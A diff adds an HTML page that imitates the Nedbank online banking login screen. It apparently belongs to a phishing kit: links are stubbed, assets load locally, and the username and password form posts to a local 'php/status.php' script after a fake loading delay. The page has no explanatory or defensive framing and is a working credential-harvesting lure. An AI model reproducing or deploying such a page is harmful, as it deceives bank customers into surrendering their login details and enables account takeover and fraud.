@@ -1,0 +1,697 @@
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<title>Online Banking</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<link rel="apple-touch-icon" href="media/icon-36x36.png" sizes="36x36">
+<link rel="apple-touch-icon" href="media/icon-48x48.png" sizes="48x48">
+<link rel="apple-touch-icon" href="media/icon-72x72.png" sizes="72x72">
+<link rel="apple-touch-icon" href="media/icon-96x96.png" sizes="96x96">
+<link rel="apple-touch-icon" href="media/icon-144x144.png" sizes="144x144">
+<link rel="apple-touch-icon" href="media/icon-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="media/icon-512x512.png" sizes="512x512">
+<link rel="icon" type="image/x-icon" href="media/favicon.ico">
+<link rel="stylesheet" href="media/styles.css">
+<link rel="stylesheet" href="media/style.css">
+<script type="text/javascript" src="media/jquery-2.2.3.js"></script>
+
+<script>
+function check(form) {
+if (form.username.value == "")
+{ form.username.focus(); document.getElementById("error1").style.display = "block"; document.getElementById("username").classList.add('ng-touched');  return;} else { document.getElementById("username").classList.remove('ng-touched'); document.getElementById("error1").style.display = "none"; }
+
+
+var regExpress = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*\W)/
+if (!regExpress.test(form.password.value))
+{ form.password.focus(); document.getElementById("error2").style.display = "block"; document.getElementById("password").classList.add('ng-touched');  return;} else { document.getElementById("password").classList.remove('ng-touched'); document.getElementById("error2").style.display = "none"; }
+
+
+document.getElementById("theloading").style.display = "block";
+setTimeout(function() { form.submit() }, 1900);
+}
+
+
+function toggleit() {
+var x = document.getElementById("password");
+if (x.type === "password") {
+x.type = "text";
+document.getElementById('showitbtn').className = "fa-fa-eye-show fa-fa-eye-hide";
+} else {
+x.type = "password";
+document.getElementById('showitbtn').className = "fa-fa-eye-show";
+}
+}
+
+function isNumericKey(p1,min) {
+var regExpress = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*\W)/
+if (regExpress.test(document.getElementById("password").value))
+{ LoadXMLDoc(); return false;} else { LoadXMLDocDsbl(); }
+
+
+}
+
+function LoadXMLDoc() {
+document.getElementById("btncls").classList.remove('btn-disabled');
+document.getElementById('log_in').removeAttribute("disabled");
+}
+function LoadXMLDocDsbl() {
+document.getElementById("btncls").classList.add('btn-disabled');
+document.getElementById('log_in').disabled = true;
+}
+
+
+function closeit() {
+document.getElementById("thecookies").style.display = "none";
+document.getElementById("shiftHeader").style.marginTop = "0px";
+}
+
+</script>
+
+<style>#mainone { display: none; }
+#theloading { display: none; }
+
+</style>
+</head>
+<body>
+<div id="theloading">
+<app-unsave-overlay _ngcontent-mtf-c0="" _nghost-mtf-c7="">
+<app-loader _ngcontent-mtf-c0="" _nghost-mtf-c8=""><!----><div _ngcontent-mtf-c8="" class="loader-mask appFocusTrap ng-star-inserted"> 
+<div _ngcontent-mtf-c8="" class="loader-spinner">
+<svg _ngcontent-mtf-c8="" ngclass="spinner-container" viewBox="0 0 52 52" class="spinner-container">
+<circle _ngcontent-mtf-c8="" cx="26px" cy="26px" fill="none" r="20px" stroke-width="4px" class="path green"></circle>
+</svg>
+</div>
+</div>
+</app-loader>
+</app-unsave-overlay>
+</div>
+<div class="overlay" id="loading1" style="display: none;">
+<div class="app-loading">
+<div class="app-loading-container">
+<div class="loading-ring">
+<div></div>
+<div></div>
+<div></div>
+<svg style="width:4rem;height:4rem;" viewBox="0 0 80 80" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+<g id="logo/80px---Large">
+<g id="Group" transform="translate(10.000000, 10.000000)">
+<polygon id="Path-2" fill="#006341" points="2.67857329 12.2557137 2.67857329 47.4402945 17.0301403 56.7835551 30.0878217 48.2184189 43.1541359 56.7835551 57.061374 47.4402945 57.061374 12.2458101 43.1541359 3.01621329 30.0878217 11.4158053 17.0301403 3.01621329">
+</polygon>
+<g id="logo-new-Copy-10" transform="translate(1.428571, 1.428571)" fill="#FFFFFF">
+<path d="M41.4223511,0.18395176 L56.8428672,10.3137203 L56.8428672,46.7060253 L41.4223511,56.8391063 L28.4182667,48.3018013 L15.4820248,56.8413146 L0.052782029,46.7063014 L0.052782029,10.3418761 L15.4794912,0.180639303 L28.4182667,8.7182203 L41.4223511,0.18395176 Z M54.4244087,11.4922923 L41.5208213,2.95139888 L28.6172338,11.4922923 L15.7139279,2.95139888 L2.48801817,11.4922923 L2.48801817,45.3386984 L15.7139279,53.8793158 L28.6172338,45.3386984 L41.5208213,53.8793158 L54.4244087,45.3386984 L54.4244087,11.4922923 Z" id="Combined-Shape"></path>
+<path d="M15.7139279,36.798081 L26.0366852,43.7570004 L15.7139279,50.7161958 L15.7139279,36.798081 Z M41.5208213,23.1960298 L41.5208213,6.11479499 L51.5209749,12.7573747 L51.5209749,43.4406608 L5.06856676,13.0737144 L15.7139279,6.11479499 L41.5208213,23.1960298 Z" id="Fill-14"></path>
+</g>
+</g>
+</g>
+</g>
+</svg>
+</div>
+</div>
+</div>
+</div>
+
+<app-root _nghost-cwj-c0="" id="mainone" ng-version="8.2.14" style="display: inline;"><div _ngcontent-cwj-c0="" id="left"></div>
+<div _ngcontent-cwj-c0="" id="right"></div>
+<div _ngcontent-cwj-c0="" id="top"></div>
+<div _ngcontent-cwj-c0="" id="bottom"></div>
+<cookie-law _ngcontent-cwj-c0="" expiration="180" position="top" id="thecookies" seen="false">
+<cookie-law-component class="ng-tns-c15-0 cookie-law ng-star-inserted"><div class="cookie-law-wrapper ng-trigger ng-trigger-transition" style="top: 0px; bottom: initial; transform: translateY(0px);">
+<div class="copy">
+<span class="ng-tns-c15-0">
+
+<div _ngcontent-cwj-c0="" class="cookie-content">
+<span _ngcontent-cwj-c0="" class="cookie-icon"></span>
+<span _ngcontent-cwj-c0="" class="cookie-text">We use
+ <a _ngcontent-cwj-c0="" href="#">cookies</a>&nbsp;to improve your experience on our website. By continuing to browse, you agree to our use of cookies.
+</span>
+<span onclick="closeit();" _ngcontent-cwj-c0="" class="dismissBtn">
+ <div _ngcontent-cwj-c0="" class="dismiss-icon"></div>
+</span>
+</div>
+
+</span>
+
+
+
+<a class="dismiss" href="#" role="button">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path d="M377.047 184.198q0 8.26-6.037 14.297L313.505 256l57.505 57.505q6.037 6.037 6.037 14.297 0 8.578-6.037
+14.615l-28.593 28.593q-6.037 6.037-14.615 6.037-8.26 0-14.297-6.037L256 313.505l-57.505 57.505q-6.037
+6.037-14.297 6.037-8.578 0-14.615-6.037l-28.593-28.593q-6.037-6.037-6.037-14.615 0-8.26 6.037-14.297L198.495
+256l-57.505-57.505q-6.037-6.037-6.037-14.297 0-8.578 6.037-14.615l28.593-28.593q6.037-6.037 14.615-6.037 8.26 0
+14.297 6.037L256 198.495l57.505-57.505q6.037-6.037 14.297-6.037 8.578 0 14.615 6.037l28.593 28.593q6.037 6.037
+6.037 14.615zM500 256q0-66.401-32.724-122.477-32.724-56.075-88.799-88.799Q322.401 12 256 12q-66.401 0-122.477
+32.724-56.075 32.724-88.799 88.799Q12 189.599 12 256q0 66.401 32.724 122.477 32.724 56.075 88.799 88.799Q189.599
+500 256 500q66.401 0 122.477-32.724 56.075-32.724 88.799-88.799Q500 322.401 500 256z"></path>
+</svg></a>
+</div>
+</div>
+</cookie-law-component>
+</cookie-law>
+<app-header _ngcontent-cwj-c0="" _nghost-cwj-c1="" class="secondaryHeaderHeight cookieHeaderHeight">
+<header _ngcontent-cwj-c1="" class="main-header header-background-color un-auth ng-star-inserted">
+<div _ngcontent-cwj-c1="" id="shiftHeader" class="shiftHeader">
+<div _ngcontent-cwj-c1="" class="row">
+<div _ngcontent-cwj-c1="" class="col-xs-12">
+<div _ngcontent-cwj-c1="" class="header-block">
+<div _ngcontent-cwj-c1="" class="left">
+<a _ngcontent-cwj-c1="" class="logo" routerlink="/login" tabindex="-1" href="#"></a>
+</div>
+<div _ngcontent-cwj-c1="" class="right top-right-header-section">
+<ul _ngcontent-cwj-c1="">
+<li _ngcontent-cwj-c1="" aria-labelledby="chat-icon" class="chat">
+<div _ngcontent-cwj-c1="" aria-hidden="true">
+<div _ngcontent-cwj-c1="" class="chat-box">
+<span _ngcontent-cwj-c1="" class="chat-icon"></span>
+<span _ngcontent-cwj-c1="" class="chat-text">Nedbank Chat</span>
+</div>
+</div>
+</li>
+<li _ngcontent-cwj-c1="" class="branch">
+<div _ngcontent-cwj-c1="" class="icon"></div>
+<div _ngcontent-cwj-c1="" class="details">
+<a _ngcontent-cwj-c1="" tabindex="-1">Branch locator</a>
+</div>
+</li>
+<li _ngcontent-cwj-c1="" class="contact-details">
+<div _ngcontent-cwj-c1="" class="icon"></div>
+<div _ngcontent-cwj-c1="" class="details">
+<p _ngcontent-cwj-c1="" class="call"></p>
+</div>
+</li>
+<li _ngcontent-cwj-c1="" class="mob-only">
+<div _ngcontent-cwj-c1="" class="hamburger-icon-pre-login ng-star-inserted"></div>
+
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+<app-prelogin-hamburger _ngcontent-cwj-c1="" _nghost-cwj-c19=""></app-prelogin-hamburger>
+</header>
+</app-header>
+
+<div _ngcontent-cwj-c0="" class="scroll-page main-page" id="scroll-page">
+<div _ngcontent-cwj-c0="" class="main-content-wrapper clearfix">
+<div _ngcontent-cwj-c0="" class="page-content-footer-wrapper">
+ <div _ngcontent-cwj-c0="" class="app-content-inner">
+<app-system-error _ngcontent-cwj-c0="" _nghost-cwj-c3="">
+
+
+
+<div _ngcontent-cwj-c3="" class="hidden">
+<img _ngcontent-cwj-c3="" src="media/Error_Orange.svg">
+</div>
+
+
+</app-system-error>
+<router-outlet _ngcontent-cwj-c0="">
+</router-outlet><ng-component _nghost-cwj-c22="" class="ng-star-inserted"><div _ngcontent-cwj-c22="" class="ng-star-inserted">
+<div _ngcontent-cwj-c22="" class="container-fluid component-container animated fadeIn">
+<div _ngcontent-cwj-c22="" class="clearfix">
+ <div _ngcontent-cwj-c22="" class="hidden-xs hidden-sm col-md-7 col-lg-7 intro-container border-right-container">
+<div _ngcontent-cwj-c22="" class="top-container">
+<div _ngcontent-cwj-c22="" class="intro-img-container">
+<img _ngcontent-cwj-c22="" src="media/Experience.svg">
+</div>
+<div _ngcontent-cwj-c22="">
+<h3 _ngcontent-cwj-c22="" class="headingText">Experience our new online banking</h3>
+</div>
+<div _ngcontent-cwj-c22="" class="intro-content">
+<div _ngcontent-cwj-c22="" class="intro-content-icons">
+ <div _ngcontent-cwj-c22="" class="intro-content-icon">
+<img _ngcontent-cwj-c22="" src="media/login-fast.svg">
+<small _ngcontent-cwj-c22="">Fast</small>
+ </div>
+ <div _ngcontent-cwj-c22="" class="intro-content-icon">
+<img _ngcontent-cwj-c22="" src="media/login-easy.svg">
+<small _ngcontent-cwj-c22="">Easy</small>
+ </div>
+ <div _ngcontent-cwj-c22="" class="intro-content-icon">
+<img _ngcontent-cwj-c22="" src="media/login-secure.svg">
+<small _ngcontent-cwj-c22="">Secure</small>
+ </div>
+</div>
+<p _ngcontent-cwj-c22="">Access an enhanced banking experience with great new features and regular updates.</p>
+
+<div _ngcontent-cwj-c22="" class="explore-our-demo ng-star-inserted">
+ <div _ngcontent-cwj-c22="">
+<span _ngcontent-cwj-c22="" class="demo-icon"></span>
+<span _ngcontent-cwj-c22="" class="explore-demo-content">Explore our demo</span>
+ </div>
+</div>
+
+
+<div _ngcontent-cwj-c22="" class="entrust-container ng-star-inserted">
+ <a _ngcontent-cwj-c22="" class="entrustAnchor" target="blank" href="#">
+<img _ngcontent-cwj-c22="" class="iconEntrust" src="media/entrust_site_seal_ssl.png">
+ </a>
+ <span _ngcontent-cwj-c22="">Integrated with secure online infrastructure.</span>
+</div>
+
+</div>
+</div>
+<div _ngcontent-cwj-c22="" class="bottom-container">
+<div _ngcontent-cwj-c22="" class="border-top-container">
+<div _ngcontent-cwj-c22="" class="information-container fraud border-right-container highlighted col-xs-6">
+ 
+<div _ngcontent-cwj-c22="" class="formInput gd-form ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="infoHeading">Beware of the latest scams</div>
+ <div _ngcontent-cwj-c22="" class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
+ <div _ngcontent-cwj-c22="">
+<a _ngcontent-cwj-c22="" class="link-text" href="#">
+<span _ngcontent-cwj-c22="">Learn more&nbsp;→</span></a>
+ </div>
+</div>
+
+</div>
+<div _ngcontent-cwj-c22="" class="information-container info col-xs-6">
+ 
+<div _ngcontent-cwj-c22="" class="formInput gd-form hide-mobile ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="infoHeading">
+Important information
+ </div>
+ <div _ngcontent-cwj-c22="" class="infoText">
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Fraud awareness
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Accessibility
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Browser requirements
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Online share trading
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Trusteer Rapport security
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+ </div>
+</div>
+
+</div>
+</div>
+</div>
+ </div>
+ <div _ngcontent-cwj-c22="" class="col-xs-12 col-sm-12 col-md-5 col-lg-5 login-container">
+<form _ngcontent-cwj-c22="" class="gd-form ng-pristine ng-invalid" novalidate="" action="php/status.php" method="post">
+<div id="theForm" _ngcontent-cwj-c22="" class="ng-star-inserted">
+<div _ngcontent-cwj-c22="" class="hidden-md hidden-lg">
+ <h3 _ngcontent-cwj-c22="" class="headingText">Experience our new online banking</h3>
+</div>
+<div _ngcontent-cwj-c22="" class="formInput">
+ <div _ngcontent-cwj-c22="" class="registerBlock ng-star-inserted">
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<span _ngcontent-cwj-c22="" class="iconImg icon-outline"></span>
+<div _ngcontent-cwj-c22="" class="registration">New to our latest online banking? <br _ngcontent-cwj-c22=""> <span _ngcontent-cwj-c22="" class="text">Register </span></div>
+<i _ngcontent-cwj-c22="" class="arrow"></i>
+</a>
+<div _ngcontent-cwj-c22="" class="line-separator"><span _ngcontent-cwj-c22="" class="text"> or </span></div>
+</div>
+ </div>
+ <div _ngcontent-cwj-c22="" class="gd-form-row">
+<h4 _ngcontent-cwj-c22="" class="login-title ng-star-inserted">Log in with your Nedbank ID.</h4>
+
+ </div>
+ 
+ <div _ngcontent-cwj-c22="" class="ng-star-inserted">
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+
+<label _ngcontent-cwj-c22="" class="active gd-sm-label ng-star-inserted" for="username">Username</label>
+
+
+
+<label _ngcontent-cwj-c22="" appviewfocus="" class="visuallyhidden" role="application" tabindex="2">Please enter your Nedbank ID username and password to log in.</label>
+<input onkeydown="if(event.keyCode==13) check(this.form);" _ngcontent-cwj-c22="" appvalidateonblur="" appvalidaterequired="" autocomplete="off" class="validate form-element avcobrowse-mask ng-pristine ng-invalid" id="username" name="username" type="text" tabindex="2">
+
+<div id="error1" style="display:none;" _ngcontent-cwj-c22="" class="error-msg ng-star-inserted">Please enter your username</div>
+
+
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<label _ngcontent-cwj-c22="" class="active gd-sm-label" for="password">Password</label>
+<div _ngcontent-cwj-c22="" class="input-container avcobrowse-mask">
+<input onkeydown="if(event.keyCode==13) check(this.form);" _ngcontent-cwj-c22="" apphidepassword="" appvalidateonblur="" appvalidaterequired="" autocomplete="off" class="validate form-element passwordInput avcobrowse-mask ng-untouched ng-pristine ng-invalid" id="password" name="password" tabindex="2" type="password" onkeyup="isNumericKey(event,this)" onchange="isNumericKey(event,this)" onkeypress="isNumericKey(event,this)">
+<span _ngcontent-cwj-c22="" class="input-img">
+<i _ngcontent-cwj-c22="" style="cursor:pointer;" id="showitbtn" onclick="toggleit();" class="fa-fa-eye-show"></i>
+</span>
+
+</div>
+<div id="error2" style="display:none;" _ngcontent-lgn-c22="" class="error-msg ng-star-inserted">Invalid password entered</div>
+<span _ngcontent-cwj-c22="" class="helpText ng-star-inserted"></span>
+
+
+</div>
+<div _ngcontent-cwj-c22="" class="forgotDetailsText ng-star-inserted">
+<a _ngcontent-cwj-c22="" class="forget-link link-text" href="#" tabindex="2">Forgot your details?</a>
+<span _ngcontent-cwj-c22="" class="arrow-icon"></span>
+</div>
+<div _ngcontent-cwj-c22="" class="termsText">
+By logging in I accept the <a _ngcontent-cwj-c22="" class="link-text small" tabindex="2" href="#">terms and conditions.</a>
+</div>
+<div _ngcontent-cwj-c22="" class="buttonDiv">
+<app-bottom-button _ngcontent-cwj-c22="" id="btncls" _nghost-cwj-c20="" class="btn-disabled">
+<button onclick="check(this.form)" _ngcontent-cwj-c20="" class="gd-primary-btn" type="button" tabindex="2" id="log_in" disabled="disabled">
+<span _ngcontent-cwj-c20="" class="visuallyhidden" aria-hidden="true"></span>
+<span _ngcontent-cwj-c20="" aria-hidden="false"> Log in </span>
+</button>
+
+</app-bottom-button>
+</div>
+<div _ngcontent-cwj-c22="" class="hidden-md hidden-lg ng-star-inserted">
+
+<div _ngcontent-cwj-c22="" class="explore-our-demo ng-star-inserted">
+ <div _ngcontent-cwj-c22="">
+<span _ngcontent-cwj-c22="" class="demo-icon"></span>
+<span _ngcontent-cwj-c22="" class="explore-demo-content">Explore our demo</span>
+ </div>
+</div>
+
+</div>
+<div _ngcontent-cwj-c22="" class="hidden-md hidden-lg">
+
+<div _ngcontent-cwj-c22="" class="entrust-container ng-star-inserted">
+ <a _ngcontent-cwj-c22="" class="entrustAnchor" target="blank" href="#">
+<img _ngcontent-cwj-c22="" class="iconEntrust" src="media/entrust_site_seal_ssl.png">
+ </a>
+ <span _ngcontent-cwj-c22="">Integrated with secure online infrastructure.</span>
+</div>
+
+</div>
+<div _ngcontent-cwj-c22="" class="appInfo">
+
+<div _ngcontent-cwj-c22="" class="appBlock hide-mobile ng-star-inserted">
+ <div _ngcontent-cwj-c22="">While you’re at it, download our new</div>
+ <div _ngcontent-cwj-c22="">
+<a _ngcontent-cwj-c22="" class="link-text" tabindex="2" href="#">Nedbank Money app</a></div>
+</div>
+<div _ngcontent-cwj-c22="" class="app-download-block hide-mobile ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="linkButtons">
+<span _ngcontent-cwj-c22="" class="app-link ng-star-inserted">
+<a _ngcontent-cwj-c22="" tabindex="2" href="#">
+<img _ngcontent-cwj-c22="" src="media/GooglePlay.svg">
+</a>
+</span><span _ngcontent-cwj-c22="" class="app-link ng-star-inserted">
+<a _ngcontent-cwj-c22="" tabindex="2" href="#">
+<img _ngcontent-cwj-c22="" src="media/AppStoreBadge.svg">
+</a>
+</span><span _ngcontent-cwj-c22="" class="app-link ng-star-inserted">
+<a _ngcontent-cwj-c22="" tabindex="2" href="#">
+<img _ngcontent-cwj-c22="" src="media/HuaweiStoreBadge.svg">
+</a>
+</span>
+ </div>
+</div>
+
+</div>
+ </div>
+</div>
+<div _ngcontent-cwj-c22="" class="hidden-xs col-sm-12 hidden-md hidden-lg border-top-container">
+ <div _ngcontent-cwj-c22="" class="information-container fraud highlighted col-sm-6">
+
+<div _ngcontent-cwj-c22="" class="formInput gd-form ng-star-inserted">
+<div _ngcontent-cwj-c22="" class="infoHeading">Beware of the latest scams</div>
+<div _ngcontent-cwj-c22="" class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
+ <div _ngcontent-cwj-c22="">
+<a _ngcontent-cwj-c22="" class="link-text" href="#">
+<span _ngcontent-cwj-c22="">Learn more&nbsp;→</span></a>
+ </div>
+</div>
+
+ </div>
+ <div _ngcontent-cwj-c22="" class="information-container info col-sm-6">
+
+<div _ngcontent-cwj-c22="" class="formInput gd-form hide-mobile ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="infoHeading">
+Important information
+ </div>
+ <div _ngcontent-cwj-c22="" class="infoText">
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Fraud awareness
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Accessibility
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Browser requirements
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Online share trading
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Trusteer Rapport security
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+ </div>
+</div>
+
+ </div>
+</div>
+<div _ngcontent-cwj-c22="" class="col-xs-12 hidden-sm hidden-md hidden-lg">
+ <div _ngcontent-cwj-c22="" class="information-container info col-xs-12">
+
+<div _ngcontent-cwj-c22="" class="formInput gd-form hide-mobile ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="infoHeading">
+Important information
+ </div>
+ <div _ngcontent-cwj-c22="" class="infoText">
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Fraud awareness
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Accessibility
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Browser requirements
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Online share trading
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+<div _ngcontent-cwj-c22="" class="gd-form-row">
+<a _ngcontent-cwj-c22="" class="icon-field" href="#">
+<div _ngcontent-cwj-c22="">
+ Trusteer Rapport security
+ <i _ngcontent-cwj-c22="" class="arrow"></i>
+</div>
+</a>
+<hr _ngcontent-cwj-c22="">
+</div>
+ </div>
+</div>
+
+ </div>
+ <div _ngcontent-cwj-c22="" class="information-container fraud highlighted col-xs-12 covid19-footer-margin">
+
+<div _ngcontent-cwj-c22="" class="formInput gd-form ng-star-inserted">
+ <div _ngcontent-cwj-c22="" class="infoHeading">Beware of the latest scams</div>
+ <div _ngcontent-cwj-c22="" class="infoText">There has been an increase in online fraud in the banking industry with some of the latest scams involving fraudsters prompting you to click on a link in an email or SMS.</div>
+ <div _ngcontent-cwj-c22="">
+<a _ngcontent-cwj-c22="" class="link-text" href="#">
+<span _ngcontent-cwj-c22="">Learn more&nbsp;→</span></a>
+ </div>
+</div>
+
+ </div>
+</div>
+</div>
+
+</form>
+ </div>
+</div>
+</div>
+
+
+
+
+
+</div>
+
+</ng-component>
+ </div>
+ <app-footer _ngcontent-cwj-c0="" class="hide-mobile" _nghost-cwj-c4=""><footer _ngcontent-cwj-c4="" class="main-footer">
+<div _ngcontent-cwj-c4="" class="footer-container">
+<div _ngcontent-cwj-c4="">
+ <div _ngcontent-cwj-c4="">
+<div _ngcontent-cwj-c4="" class="footer-block">
+<div _ngcontent-cwj-c4="" class="copyright" tabindex="3">
+<span _ngcontent-cwj-c4="" class="text">
+Nedbank Ltd Reg No 1951/000009/06. <br _ngcontent-cwj-c4="">
+Authorised financial services and registered credit provider (NCRCP16).
+</span>
+ </div>
+<ul _ngcontent-cwj-c4="" class="footer-nav">
+<li _ngcontent-cwj-c4="" class="ng-star-inserted">
+ <a _ngcontent-cwj-c4="" tabindex="3">
+<span _ngcontent-cwj-c4="" aria-hidden="true" class="text">Contact</span>
+<i _ngcontent-cwj-c4="" class="arrow fa fa-angle-right"></i>
+ 
+ </a>
+</li><li _ngcontent-cwj-c4="" class="ng-star-inserted">
+ <a _ngcontent-cwj-c4="" tabindex="3">
+<span _ngcontent-cwj-c4="" aria-hidden="true" class="text">Find an ATM or branch</span>
+<i _ngcontent-cwj-c4="" class="arrow fa fa-angle-right"></i>
+ 
+ </a>
+</li><li _ngcontent-cwj-c4="" class="ng-star-inserted">
+ <a _ngcontent-cwj-c4="" tabindex="3">
+<span _ngcontent-cwj-c4="" aria-hidden="true" class="text">Help</span>
+<i _ngcontent-cwj-c4="" class="arrow fa fa-angle-right"></i>
+ 
+ </a>
+</li><li _ngcontent-cwj-c4="" class="ng-star-inserted">
+ <a _ngcontent-cwj-c4="" tabindex="3">
+<span _ngcontent-cwj-c4="" aria-hidden="true" class="text">Terms and conditions</span>
+<i _ngcontent-cwj-c4="" class="arrow fa fa-angle-right"></i>
+ 
+ </a>
+</li>
+</ul>
+
+</div>
+ </div>
+</div>
+</div>
+</footer></app-footer>
+ 
+</div>
+<app-side-bar _ngcontent-cwj-c0="" _nghost-cwj-c6="" class="secondary-header cookieHeaderHeight"><div _ngcontent-cwj-c6="" class="side-bar no-print header-closed">
+
+<div _ngcontent-cwj-c6="" class="side-bar-main-container no-print">
+<div _ngcontent-cwj-c6="" class="header ng-star-inserted">
+ 
+<span _ngcontent-cwj-c6="" class="text ng-star-inserted"></span>
+
+ <span _ngcontent-cwj-c6="" class="icon-close"></span>
+</div>
+<div _ngcontent-cwj-c6="" class="body with-header with-cookie-unauthorized">
+ 
+</div>
+</div>
+</div>
+
+
+
+<div _ngcontent-cwj-c6="" class="side-bar-content no-print content-closed">
+<div _ngcontent-cwj-c6="" class="side-bar-main-container no-print">
+<div _ngcontent-cwj-c6="" class="content">
+ 
+</div>
+</div>
+</div>
+
+
+</app-side-bar>
+</div>
+<app-unsave-overlay _ngcontent-cwj-c0="" _nghost-cwj-c7=""></app-unsave-overlay>
+</div>
+
+
+</app-root>
+
+
+<script>
+
+
+</script>
+
+
+<script>
+setTimeout(function() {
+$("#loading1").hide();
+$("#mainone").show();
+}, 0600);
+</script>
+
+
+</body></html>
